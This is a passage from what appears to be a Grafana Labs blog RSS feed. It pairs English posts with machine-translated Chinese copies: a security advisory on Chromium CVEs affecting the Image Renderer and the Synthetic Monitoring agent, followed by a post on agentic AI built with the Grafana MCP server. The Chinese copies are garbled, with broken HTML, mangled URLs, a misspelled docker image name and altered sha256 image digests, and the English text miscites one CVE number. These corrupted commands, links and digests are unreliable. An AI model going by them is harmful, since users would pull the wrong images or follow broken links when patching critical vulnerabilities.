&lt;code&gt;docker pull grafana/synthetic-monitoring-agent:v0.38.3-browser&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Container URL:&#xA;&lt;a href=&#34;https://hub.docker.com/layers/grafana/synthetic-monitoring-agent/v0.38.3-browser/images/sha256-3e370e303e6728d0c06ea95cf9765c789ff47c975ca197a517097f8fc1c090aa&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;https://hub.docker.com/layers/grafana/synthetic-monitoring-agent/v0.38.3-browser/images/sha256-3e370e303e6728d0c06ea95cf9765c789ff47c975ca197a517097f8fc1c090aa&lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;Documentation:&#xA;&lt;a href=&#34;/docs/grafana-cloud/testing/synthetic-monitoring/set-up/set-up-private-probes/&#34;&gt;https://grafana.com/docs/grafana-cloud/testing/synthetic-monitoring/set-up/set-up-private-probes/&lt;/a&gt; &lt;/p&gt;&#xA;&lt;h3 id=&#34;timeline-and-post-incident-review&#34;&gt;Timeline and post-incident review&lt;/h3&gt;&#xA;&lt;p&gt;Here is a detailed incident timeline starting from when we originally introduced the issue. All times are in UTC.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;2025/06/11 -   Google publish CVE-2025-5959 &lt;/li&gt;&#xA;&lt;li&gt;2025/06/18 - 23:58  Bug Bounty report submitted &lt;/li&gt;&#xA;&lt;li&gt;2025/06/18 -           Google publish CVE-2025-6191&lt;/li&gt;&#xA;&lt;li&gt;2025/06/18 -           Google publish CVE-2025-6192&lt;/li&gt;&#xA;&lt;li&gt;2025/06/19 - 08:37  Bug bounty accepted and received &lt;/li&gt;&#xA;&lt;li&gt;2025/06/19 - 08:56  Updated image renderer published to Github (3.12.8)&lt;/li&gt;&#xA;&lt;li&gt;2025/06/19 - 09:38  Updated image renderer deployed to Grafana Cloud &lt;/li&gt;&#xA;&lt;li&gt;2025/06/19 - 16:35  Updates applied to K6 suite deployed to Grafana Cloud&lt;/li&gt;&#xA;&lt;li&gt;2025/06/24 - 14:21 Updated Synthetic Monitoring agent released (0.38.1)&lt;/li&gt;&#xA;&lt;li&gt;2025/06/30 -            Google publish CVE-2025-6554&lt;/li&gt;&#xA;&lt;li&gt;2025/07/01 - 13:08 Freshly Updated Image Render plugin published to GitHub (3.12.9)&lt;/li&gt;&#xA;&lt;li&gt;2025/07/01 - 13:49 Updated image renderer deployed to Grafana Cloud&lt;/li&gt;&#xA;&lt;li&gt;2025/07/01 - 16:12 Updated applied to K6 suit deployed to Grafana Cloud&lt;/li&gt;&#xA;&lt;li&gt;2025/07/02 - 09:41  Updated Synthetic Monitoring agent released (0.38.3)&lt;/li&gt;&#xA;&lt;li&gt;2025/07/02 - 18:00 Blog post published&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;acknowledgements&#34;&gt;Acknowledgements&lt;/h2&gt;&#xA;&lt;p&gt;We would like to thank Alex Chapman, who reported the original exploitability of CVE-2025-959 through our&#xA;&lt;a href=&#34;/blog/2024/07/24/grafana-labs-bug-bounty-what-you-need-to-know-about-our-new-partnership-with-intigriti/&#34;&gt;bug bounty program&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;reporting-security-issues&#34;&gt;Reporting security issues&lt;/h2&gt;&#xA;&lt;p&gt;If you think you have found a security vulnerability, please go to our&#xA;&lt;a href=&#34;/legal/report-a-security-issue/&#34;&gt;Report a security issue page&lt;/a&gt; to learn how to send a security report.&lt;/p&gt;&#xA;&lt;p&gt;Grafana Labs will send you a response indicating the next steps in handling your report. After the initial reply to your report, the security team will keep you informed of the progress towards a fix and full announcement, and may ask for additional information or guidance.&lt;/p&gt;&#xA;&lt;p&gt;Important: We ask you to not disclose the vulnerability before it has been fixed and announced, unless you received a response from the Grafana Labs security team that you can do so.&lt;/p&gt;&#xA;&lt;p&gt;You can also read more about&#xA;&lt;a href=&#34;https://github.com/grafana/bugbounty&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;our bug bounty program&lt;/a&gt; and find out who has made our&#xA;&lt;a href=&#34;/security/hall-of-fame/&#34;&gt;Security Hall of Fame&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;security-announcements&#34;&gt;Security announcements&lt;/h2&gt;&#xA;&lt;p&gt;We maintain a&#xA;&lt;a href=&#34;/tags/security/&#34;&gt;security category&lt;/a&gt; on our blog, where we will always post a summary, remediation, and mitigation details for any patch containing security fixes. You can also subscribe to our&#xA;&lt;a href=&#34;/tags/security/index.xml&#34;&gt;RSS feed&lt;/a&gt;.&lt;/p&gt;】&lt;p&gt;我们已经发布了Grafana Image渲染器插件和合成监视剂的更新，以解决四个关键影响漏洞（&#xA;&lt;A href =“ https://www.cve.org/cverecord?id=cve-2025-5959” target =“ _ blank” rel =“ noopener noreferrer”&gt; cve-2025-5959 &lt;/a&gt;&#xA;&lt;a href =“ https://www.cve.org/cverecord?id=cve-2025-6554” target =“ _ blank” rel =“ noopener noreferrer”&gt; cve-2025-6554 &lt;/a&gt;&#xA;&lt;a href =“ https://www.cve.org/cverecord?id=cve-2025-6191” target =“ _ blank” rel =“ noopener noreferrer”&gt; cve-2025-6191 &lt;/a&gt; &lt;/a&gt; &lt;/a&gt;和&#xA;&lt;a href =“ https://www.cve.org/cverecord？id=cve-2025-6192“ target =“ _ black” rel =“ noopener noreferrer”&gt; cve-2025-6192 &lt;/a&gt;）在Chromium，第三部分库中找到。 Google Chrome浏览器的下游项目Chromium具有允许远程代码执行的漏洞。&lt;/p&gt;&#xA;&lt;p&gt;建议操作Grafana Image渲染器插件或具有合成监视剂的本地安装以更新其系统。如果您正在运行Grafana Image Renderer &lt;3.12.9或合成监视代理&lt;0.38.3您应该尽快更新。&lt;/p&gt;&#xA;&lt;p&gt;适当的补丁已应用于Grafana Cloud。与往常一样，我们与所有获得Grafana Cloud Pro的许可的云提供商进行了密切的协调。他们已收到通知，并确认他们的产品在此公告时是安全的。这适用于Azure托管的Grafana。&lt;/p&gt;&#xA;&lt;p&gt;使用CVSS 3.1方法论，我们将此CVE评为对Grafana操作环境的关键漏洞。截至今天，NIST尚未为这些CVE分配分数，但是您可以查看CVE在国家脆弱性数据库中的状态。&lt;/p&gt;&#xA;&lt;H2 ID =“解决方案和降低”&gt;解决方案和缓解率&lt;/h2&gt;&#xA;&lt;p&gt;要补充此漏洞，请按照以下说明为您的产品进行说明。  &lt;/p&gt;&#xA;&lt;H3 ID =“ Grafana-image-Renderer”&gt; Grafana Image Renderer &lt;/h3&gt;&#xA;&lt;p&gt;最低版本：3.12.9 &lt;/p&gt;&#xA;&lt;p&gt;插件安装：&lt;code&gt; grafana-cli插件安装grafana-image-renderer &lt;/code&gt; &lt;/p&gt;&#xA;&lt;p&gt;容器安装：&lt;code&gt; Docker Pull grafana/grafana-image-Renderer：3.12.9 &lt;/code&gt; &lt;/p&gt;&#xA;&lt;p&gt;容器URL：&#xA;&lt;a href=&#34;https://hub.docker.com/layers/grafana/grafana-image-renderer/3.12.9/images/sha256-8603027604d5c332ddecac614e156791d1157b234f7966485d1f4c97346a3dd7&#34; target =“ _ blank” rel =“ noopener noreferrer“&gt; https://hub.docker.com/layers/grafana/grafana-image-renderer/3.12.9/ima GES/SHA256-8603027604D5C332DDECAC614E156791D1157B21157B234F7966485D1F4C97346A3DDD7 &lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;文档：&#xA;&lt;a href =“/grafana/plugins/grafana-image-Renderer/”&gt; https://grafana.com/grafana/plafana/plugins/grafana-image-renderer/ &lt;/a&gt; &lt;/p&gt;&#xA;在&#xA;&lt;p&gt;最低版本：0.38.3 &lt;/p&gt;&#xA;&lt;p&gt;软件包下载：&#xA;&lt;a href =“ https://github.com/grafana/synthetic-monitoring-agent/releases/tag/v0.38.3” target =“ _ blank” noreferrer”&gt; https://github.com/grafana/synthetic-monitoring-agent/releases/tag/v0.38.3 &lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;容器安装：&lt;code&gt;Docker拉Grafana/nytthetic-Monitoring-Agent：V0.38.3-浏览器&lt;/code&gt; &lt;/p&gt;&#xA;&lt;p&gt;容器URL：&#xA;&lt;a href =“ https://hub.docker.com/layers/grafana/synthetic-monitoring-agent/v0.38.3-brow Ser/Images/SHA256-3E370E303E6728D0C06EA95CF9765C789FF47C975CA197A517097F8F8F8FC1090AA“ target =“ _ blank” rel =“ noopener noreferrer“&gt; https://hub.docker.com/layers/grafana/synthetic-monitoring-agent/v0.38.3-brows ER/Images/SHA256-3E370E303E6728D0C06EA95CF9765C789FF47C975CA197A517097F8FC1C090AA &lt;/a&gt; &lt;/p&gt;&#xA;&lt;p&gt;文档：&#xA;&lt;a href =“/docs/docs/grafana-cloud/testing/synthetic-monitoring/set-up/set-up-private-probes/“&gt; https://grafana.com/docs/docs/grafana-cloud/grafana-cloud/testing/testing/testing/ssenthetic-monoring/set--monitoring/set-monitoring/set-up/set-up-up-p----------------------------------------------------------er-probes/ &lt;/a一下&lt;/a&gt; &lt;/p&gt; &lt;/p&gt;&#xA;在&#xA;&lt;p&gt;这是一个详细的事件时间表，从我们最初引入该问题时。所有时间都在UTC中。&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt; 2025/06/11-Google出版CVE-2025-5959 &lt;/li&gt;&#xA;&lt;li&gt; 2025/06/18-23:58 Bug Bounty报告提交&lt;/li&gt;&#xA;&lt;li&gt; 2025/06/18-Google出版CVE-2025-6191 &lt;/li&gt;&#xA;&lt;li&gt; 2025/06/18-Google出版CVE-2025-6192 &lt;/li&gt;&#xA;&lt;li&gt; 2025/06/19-08：37 Bug Bounty接受并收到&lt;/li&gt;&#xA;&lt;li&gt; 2025/06/19-08：56更新的图像渲染器发布给GitHub（3.12.8）&lt;/li&gt;&#xA;&lt;li&gt; 2025/06/19-09：38更新的图像渲染器部署到Grafana Cloud &lt;/li&gt;&#xA;&lt;li&gt; 2025/06/19-16：35应用于部署到Grafana Cloud的K6套件的更新&lt;/li&gt;&#xA;&lt;li&gt; 2025/06/24-14：21更新的合成监测剂（0.38.1）&lt;/li&gt;&#xA;&lt;li&gt; 2025/06/30-Google出版CVE-2025-6554 &lt;/li&gt;&#xA;&lt;li&gt; 2025/07/01-13：08新鲜更新的图像渲染插件发布给GitHub（3.12.9）&lt;/li&gt;&#xA;&lt;li&gt; 2025/07/01-13:49更新的图像渲染器部署到Grafana Cloud &lt;/li&gt;&#xA;&lt;li&gt; 2025/07/01-16:12更新到部署到Grafana Cloud的K6西装&lt;/li&gt;&#xA;&lt;li&gt; 2025/07/02-09：41更新的合成监测剂（0.38.3）&lt;/li&gt;&#xA;&lt;li&gt; 2025/07/02-18：00博客文章发表&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;H2 ID =“确认”&gt;确认&lt;/h2&gt;&#xA;&lt;p&gt;我们要感谢亚历克斯·查普曼（Alex Chapman），他通过我们的&#xA;&lt;a href =“/blog/2024/07/24/grafana-labs-bug-bugbug-bounty-what-you-to-to-to-to-about-about-out-new-partnership-with-instrigriti/”&gt; bug Bounty program &lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;h2 id =“报告 - 安全 - 发行”&gt;报告安全问题&lt;/h2&gt;&#xA;&lt;p&gt;如果您认为自己发现了安全漏洞，请转到我们&#xA;&lt;a href =“/legal/report-a-security-issue/”&gt;报告安全问题页面&lt;/a&gt;学习如何发送安全报告。&lt;/p&gt;&#xA;&lt;p&gt; Grafana Labs将向您发送响应，指示处理报告的下一步。在对您的报告的初步答复后，安全团队将使您了解修复和完整公告的进度，并可能要求提供其他信息或指导。&lt;/p&gt;&#xA;&lt;p&gt;重要：我们要求您在修复和宣布漏洞之前不要披露漏洞，除非您收到了Grafana Labs Security T您可以这样做。&lt;/p&gt;&#xA;&lt;p&gt;您也可以阅读有关&#xA;&lt;a href =“ https://github.com/grafana/bugbounty” target =“ _ blank” rel =“ noopener noreferrer”&gt;我们的fub bounty program &lt;/a&gt;，找出谁使我们的人&#xA;&lt;a href =“/security/fame-of-of of of of of of of the&gt;安全名人堂&lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;H2 ID =“安全性通知”&gt;安全公告&lt;/h2&gt;&#xA;&lt;p&gt;我们维持一个&#xA;&lt;a href =“/tags/security/”&gt;安全类别&lt;/a&gt;在我们的博客上，我们将始终发布任何包含安全修复程序的补丁程序的摘要，补救和缓解详细信息。您也可以订阅我们的&#xA;&lt;a href =“/tags/security/index.xml”&gt; rss feed &lt;/a&gt;。&lt;/p&gt;</description>
      <pubDate>Wed, 02 Jul 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Going beyond AI chat response: How we&#39;re building an agentic system to drive Grafana】超越AI聊天响应：我们如何构建一个驱动Grafana的代理系统</title>
      <link>https://grafana.com/blog/2025/06/30/going-beyond-ai-chat-response-how-were-building-an-agentic-system-to-drive-grafana/</link>
      <description>【&lt;p&gt;As we look at the role AI can play in Grafana going forward, we want to move beyond the simple chat responses that dominate the world of LLMs today and into &lt;em&gt;agentic&lt;/em&gt; systems—AI that can understand, reason, and act on your behalf.&lt;/p&gt;&#xA;&lt;p&gt;The ultimate goal is to make it easy to get things done in Grafana using natural language—whether you&amp;rsquo;re a seasoned SRE or a new developer. And in the AI world, we call this moving from &lt;em&gt;chat completion&lt;/em&gt; to &lt;em&gt;task completion&lt;/em&gt;. Instead of just following up on information and reacting to it, you actually have an experience where a task is done for you.&lt;/p&gt;&#xA;&lt;p&gt;In this post, we&amp;rsquo;ll recap the key steps on this path that were recently shared at GrafanaCON 2025, from teaching LLMs to &amp;ldquo;speak&amp;rdquo; Grafana to the powerful agentic workflows this will unlock.&lt;/p&gt;&#xA;&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/cqHO0oYW6Ic?si=qipWEGaTWsg%3frel%3d0&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;&#xA;&lt;h2 id=&#34;from-simple-chat-to-speaking-grafana&#34;&gt;From simple chat to &amp;lsquo;speaking&amp;rsquo; Grafana&lt;/h2&gt;&#xA;&lt;p&gt;The first generations of LLMs have given developers a way to access the context of the internet—albeit a static snapshot of it using natural language in a single API call. And that&amp;rsquo;s useful, because we can feed some predefined context and instructions to the LLM and get a natural answer back. &lt;/p&gt;&#xA;&lt;p&gt;This has already enabled some new experiences in the Grafana ecosystem, such as&#xA;&lt;a href=&#34;/docs/grafana-cloud/monitor-applications/profiles/flamegraph-ai/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Flame graph AI&lt;/a&gt;: you provide the LLM with a flamegraph, and it gives you a human-readable explanation of the performance bottleneck. It’s a single action that leads to a single outcome. This has the advantage that it excels in a very specific environment but not so much outside of that. &lt;/p&gt;&#xA;&lt;p&gt;It has another limitation, too: That LLM knows about the internet, but it doesn’t know about your world. It can’t see your dashboards, it can’t query your data sources, and it certainly can’t tell you which of your services has an active incident right now.&lt;/p&gt;&#xA;&lt;p&gt;So, we had to teach LLMs to &amp;ldquo;speak&amp;rdquo; Grafana.&lt;/p&gt;&#xA;&lt;p&gt;The key technology that unlocks this is based on the&#xA;&lt;a href=&#34;https://docs.anthropic.com/claude/docs/tool-use#model-context-protocol&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Model Context Protocol&lt;/a&gt; (MCP) and tool calling. This allows an LLM to not only generate text but also to call predefined functions or APIs. When a user asks a question, the LLM can now decide: “Which tool should I use to help me make more sense of this request? &amp;quot; Using these tools, the LLM can pull in real-time and contextually useful information.&lt;/p&gt;&#xA;&lt;p&gt;To make this work for our projects and products, we created the open source&#xA;&lt;a href=&#34;https://github.com/grafana/mcp-grafana&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana MCP Server&lt;/a&gt;, which exposes core Grafana functionality—searching dashboards, querying Prometheus, managing incidents—as a set of tools that any MCP-compatible AI can use.&lt;/p&gt;&#xA;&lt;p&gt;This opens the door to asking questions like, &amp;ldquo;Which active incidents do I have?&amp;rdquo; The LLM sees the question, recognizes it needs live data, calls the &lt;code&gt;get_incidents&lt;/code&gt; tool from the Grafana MCP Server, receives the list of incidents from your Grafana instance, and then formulates an accurate, context-aware answer.&lt;/p&gt;&#xA;&lt;h2 id=&#34;putting-an-agent-to-work&#34;&gt;Putting an agent to work&lt;/h2&gt;&#xA;&lt;p&gt;To illustrate how agentic systems can help you during development, imagine that you’re working on a new Node.js service. You have it instrumented to expose some basic Prometheus metrics, and you have a Grafana instance ready to go. However, you haven&amp;rsquo;t had time to build your dashboards.&lt;/p&gt;&#xA;&lt;p&gt;You could follow the typical process: Navigate the Grafana UI, add a data source, and manually create panels—all of which takes time and knowledge. Or, you could simply open an AI code editor like Cursor, pair it with our MCP server, and type a natural language prompt: &amp;ldquo;Can you create a dashboard based on the metrics in this code?&amp;rdquo;&lt;/p&gt;&#xA;&lt;p&gt;Here, the agent doesn&amp;rsquo;t just guess. It initiates a multi-step plan, using the tools at its disposal from the Grafana MCP Server. It reasons that to build a useful dashboard, it must first:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Call the &lt;code&gt;list_datasources&lt;/code&gt; tool to see what&amp;rsquo;s available in your Grafana instance.&lt;/li&gt;&#xA;&lt;li&gt;Call the &lt;code&gt;list_prometheus_metric_names&lt;/code&gt; tool to analyze the metrics your app is exposing.&lt;/li&gt;&#xA;&lt;li&gt;Call tools to inspect the labels for those metrics to understand their structure.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;After gathering this context, it generates a complete, multi-panel dashboard in your Grafana instance with a single command. In seconds, a dashboard appears, created from scratch with no manual effort.&lt;/p&gt;&#xA;&lt;p&gt;But let&amp;rsquo;s take this a step further. Let&amp;rsquo;s say you notice your new dashboard is missing latency metrics. So you ask the agent: &amp;ldquo;Can you add latency metrics to this?&amp;rdquo; But there&amp;rsquo;s just one problem: You don&amp;rsquo;t have a latency metric setup yet.&lt;/p&gt;&#xA;&lt;p&gt;And here’s the really interesting part: The agent understands that the problem isn’t with the dashboard, but with the source code. It knows it can&amp;rsquo;t visualize a metric that doesn&amp;rsquo;t exist, so it explains that your app needs to be instrumented to measure request duration and then generates the exact code changes needed to add a Prometheus histogram metric.&lt;/p&gt;&#xA;&lt;p&gt;With a simple confirmation, the agent edits your &lt;code&gt;index.js&lt;/code&gt; file. Once the new metric is exposed, a final prompt of &amp;ldquo;Can you also add it to the dashboard?&amp;rdquo; is all it takes for the agent to update the existing dashboard with new panels for p95 and average request latency.&lt;/p&gt;&#xA;&lt;p&gt;This entire workflow—from identifying missing instrumentation to modifying code to updating observability—was completed in a single, continuous conversation. This is what we mean by an agent that can &lt;em&gt;drive&lt;/em&gt; Grafana. Combining both code and observability allows you to be faster and more productive.&lt;/p&gt;&#xA;&lt;h2 id=&#34;building-agents-that-drive-grafana&#34;&gt;Building agents that drive Grafana&lt;/h2&gt;&#xA;&lt;p&gt;Beyond the developer experience, the next logical step was to bring this agentic experience into Grafana. People use Grafana to monitor their service so they can keep it running reliably and troubleshoot issues quickly. But it takes a lot of time, effort, and knowledge to understand and operate complex systems. Think about how many people that have never used Grafana, have never set up an alert, or have never interacted with instrumentation. Or think about new folks that have just joined your team and don’t have your knowledge, your expertise of the system.&lt;/p&gt;&#xA;&lt;p&gt;This is where the &lt;strong&gt;Grafana Assistant&lt;/strong&gt; comes in, allowing you to just talk to Grafana and get things done. Announced at&#xA;&lt;a href=&#34;/blog/2025/05/07/llm-grafana-assistant/&#34;&gt;GrafanaCON 2025&lt;/a&gt;, Grafana Assistant deeply integrates with the Grafana ecosystem, bringing your relevant observability context with you in an easy-to-use sidebar.&lt;/p&gt;&#xA;&lt;p&gt;We’re not just democratizing data, we’re democratizing the observability experience itself—allowing you to go places, find things, create a dashboard, or ask questions about your data, all using natural language. This is where Grafana Assistant shines, allowing everyday users to use Grafana more efficiently.&lt;/p&gt;&#xA;&lt;h2 id=&#34;the-challenges-moving-toward-reliable-modular-agents&#34;&gt;The challenges: Moving toward reliable, modular agents&lt;/h2&gt;&#xA;&lt;p&gt;The ultimate goal here is to make it easier to get the most out of Grafana, but building it isn&amp;rsquo;t easy. The &amp;ldquo;ask anything&amp;rdquo; experience is hard to create because there are a million questions people could ask about their Grafana instance.&lt;/p&gt;&#xA;&lt;p&gt;Observability workflows are complex, and every user&amp;rsquo;s environment is unique. So in order to build a robust and reliable agent, we’re focusing on a few key areas:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Evaluation:&lt;/strong&gt; We&amp;rsquo;ve moved beyond &amp;ldquo;vibe testing&amp;rdquo; (i.e., &amp;ldquo;Does it feel right?&amp;rdquo;) to a framework of reproducible evaluations. We test our agents against a set of  scenarios in a controlled Grafana environment to ensure that every change improves quality and doesn&amp;rsquo;t cause regressions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Reducing token noise:&lt;/strong&gt; APIs often return structured data like JSON. While great for machines, it’s &amp;ldquo;noisy&amp;rdquo; for LLMs. We&amp;rsquo;ve found that by pre-processing API responses into more natural, semantically rich sentences, we can reduce token usage by up to 4x, which lowers cost, decreases latency, and actually improves the LLM&amp;rsquo;s performance.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Multi-agent architecture:&lt;/strong&gt; We have started with single, monolithic agents that try to do everything. Now we’re looking into building a system of &amp;ldquo;expert agents.&amp;rdquo; A central coordinator agent receives the user&amp;rsquo;s request and delegates it to a specialized agent—like a dashboard agent, a query agent, or a support agent. This modular design is easier to debug and extend, and it makes the entire system more robust.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;putting-this-into-practice-with-grafana-assistant&#34;&gt;Putting this into practice with Grafana Assistant&lt;/h2&gt;&#xA;&lt;p&gt;This journey from simple chat to tool-using, multi-step agents is what led us to build Grafana Assistant, but we’re just getting started. The AI space is ever evolving and we want to be at the front, delivering AI workflows that matter. For that, we are experimenting with data structures, specialized agents, and evaluation frameworks.&lt;/p&gt;&#xA;&lt;p&gt;If you&amp;rsquo;re interested in getting involved with what you&amp;rsquo;re building:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check out the open source&#xA;&lt;a href=&#34;https://github.com/grafana/mcp-grafana&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt; Grafana MCP Server on GitHub&lt;/a&gt; and try it with your favorite AI client.&lt;/li&gt;&#xA;&lt;li&gt;And, of course,&#xA;&lt;a href=&#34;https://docs.google.com/forms/d/e/1FAIpQLSfnuw6efbLjQIS-fkt0jt8E4tismS_Ruzr6wPXfK8PaQ0-mlw/viewform&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt; join the private preview for the Grafana Assistant&lt;/a&gt; to experience the future of observability firsthand.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;当我们看到AI在Grafana中所扮演的角色时，我们希望超越统治当今LLM世界的简单聊天响应，并进入&lt;em&gt; Agensic &lt;/em&gt;系统 - 可以理解，推理和代表您采取行动。&lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;最终目标是使使用自然语言在Grafana中完成工作 - 无论您是经验丰富的SRE还是新开发人员。在AI世界中，我们称此从&lt;em&gt;聊天完成&lt;/em&gt;到&lt;em&gt;任务完成&lt;/em&gt;。实际上，您有一个经验，而不是仅仅跟踪信息并对信息做出反应。&lt;/p&gt; &lt;/p&gt;&#xA;&lt;p&gt;在这篇文章中，我们将回顾一下最近在Grafanacon 2025分享的这条路径上的关键步骤，从教授LLM到“说” Grafana到强大的代理工作流程，这将解锁。&lt;/p&gt;&#xA;&lt;iframe width =“ 560”高度=“ 315” src =“ https://www.youtube.com/embed/cqho0oyw6ic?si = qipwegatwsg%3frel%3d0”陀螺仪;&#xA;&lt;h2 id =“从简单聊天到&#39;speake&#39;grafana &lt;/h2&gt;&#xA;&lt;p&gt; LLM的第一代为开发人员提供了一种访问Internet上下文的方法，尽管它在单个API呼叫中使用自然语言的静态快照。这很有用，因为我们可以将一些预定义的上下文和说明喂给LLM并自然答案。 &lt;/p&gt;&#xA;&lt;p&gt;这已经在Grafana生态系统中启用了一些新体验，例如&#xA;&lt;a href =“/docs/grafana-cloud/monitor-applications/profiles/flamegraph-ai/？pg = blog＆plcmt = body-txt”&gt; flame graph ai &lt;/a&gt;：您为LLM提供了FlameGraph，并为您提供了可读的性能的人类解释。这是一个单一的动作，导致单一的结果。这具有一个优势，它在非常特定的环境中脱颖而出，但在此之外没有那么多。 &lt;/p&gt;&#xA;&lt;p&gt;它也有另一个限制：LLM知道互联网，但对您的世界不了解。它看不到您的仪表板，无法查询您的数据源，并且当然无法告诉您您的哪些服务现在有一个活动事件。&lt;/p&gt;&#xA;&lt;p&gt;所以，我们必须教LLMS“说” Grafana。&lt;/p&gt;&#xA;&lt;p&gt;解锁的关键技术是基于&#xA;&lt;a href =“ https://docs.anthropic.com/claude/docs/tool-use#model-context-protocol” target =“ _ black” rel =“ noopener noreferrer”&gt; model上下文上下文协议&lt;/a&gt;（MCP）和工具调用。这使LLM不仅可以生成文本，还可以调用预定义的功能或API。当用户提出问题时，LLM现在可以决定：“我应该使用哪种工具来帮助我对此请求更有意义？”使用这些工具，LLM可以实时和上下文有用的信息。&lt;/p&gt;&#xA;&lt;p&gt;为我们的项目和产品做这项工作CTS，我们创建了开源&#xA;&lt;a href =“ https://github.com/grafana/mcp-grafana” target =“ _ blank” rel =“ noopener noreferrer”&gt; grafana mcp server &lt;/a&gt;，暴露了核心grafana功能 - 搜索仪表板，质疑Prometheus，prometheus cantibib cant in McP andim compt and incot and incot in Mcot。&#xA;&lt;p&gt;这打开了询问问题：“我有哪些主动事件？”之类的问题。 LLM看到了这个问题，识别它需要实时数据，从Grafana MCP服务器调用&lt;code&gt; get_incidents &lt;/code&gt;工具，从您的Grafana实例中接收事件列表，然后为准确的上下文感知答案。&lt;/p&gt;&#xA;在&#xA;&lt;p&gt;说明代理系统如何在开发过程中为您提供帮助，请想象您正在从事新的Node.js服务。您可以使用它来揭示一些基本的普罗米修斯指标，并且可以准备好Grafana实例。但是，您没有时间构建仪表板。&lt;/p&gt;&#xA;&lt;p&gt;您可以遵循典型的过程：浏览Grafana UI，添加数据源并手动创建面板 - 所有这些都需要时间和知识。或者，您可以简单地打开像光标这样的AI代码编辑器，将其与我们的MCP服务器配对，然后键入自然语言提示：“您可以根据此代码中的指标创建仪表板吗？” &lt;/p&gt;&#xA;&lt;p&gt;在这里，代理商不仅猜测。它使用Grafana MCP服务器可以使用的工具启动了多步计划。构建有用的仪表板的原因，必须首先：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;调用&lt;code&gt; list_datasources &lt;/code&gt;工具以查看Grafana实例中可用的内容。&lt;/li&gt;&#xA;&lt;li&gt;调用&lt;code&gt; list_prometheus_metric_names &lt;/code&gt;分析您的应用程序正在公开的指标的工具。&lt;/li&gt;&#xA;&lt;li&gt;呼叫工具检查标签的标签以了解其结构。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;收集此上下文后，它使用一个命令在Grafana实例中生成一个完整的多面板仪表板。在几秒钟内，出现仪表板，从头开始创建，没有手动努力。&lt;/p&gt;&#xA;&lt;p&gt;，但让我们进一步迈出一步。假设您注意到您的新仪表板缺少延迟指标。因此，您问代理商：“您可以向此添加延迟指标吗？”但是有一个问题：您还没有延迟度量设置。&lt;/p&gt;&#xA;&lt;p&gt;这是真正有趣的部分：代理商知道问题不是仪表板，而是源代码。它知道它无法可视化不存在的指标，因此它解释说您的应用需要进行仪器以测量请求持续时间，然后生成添加Prometheus直方图指标所需的确切代码更改。&lt;/p&gt;&#xA;&lt;p&gt;通过简单的确认，代理编辑您的&lt;code&gt; index.js &lt;/code&gt;文件。新指标暴露后，最终提示“您还可以将其添加到仪表板中吗？”代理更新EXI所需的全部带有P95的新面板和平均请求延迟的sting仪表板。&lt;/p&gt;&#xA;&lt;p&gt;整个工作流程（从识别缺少的仪器到修改代码到更新可观察性）的整个工作流程都在一次连续的对话中完成。这就是我们可以&lt;em&gt; drive &lt;/em&gt; grafana的代理商的意思。将代码和可观察性结合起来可以使您更快，更有生产力。&lt;/p&gt;&#xA;&lt;h2 id =“建筑物代理 - 驱动格拉法纳”&gt;驱动grafana &lt;/h2&gt;的建筑物&#xA;&lt;p&gt;除了开发人员的经验之外，下一个合乎逻辑的步骤是将这种代理体验带入Grafana。人们使用Grafana来监视他们的服务，以便使其可靠地运行并迅速解决问题。但是要理解和操作复杂的系统需要大量时间，精力和知识。想想有多少从未使用过Grafana，从未设置警报或从未与乐器互动的人。或考虑刚刚加入您的团队并且没有您的知识的新朋友，您对系统的专业知识。&lt;/p&gt;&#xA;&lt;p&gt;这是&lt;strong&gt; Grafana Assistant 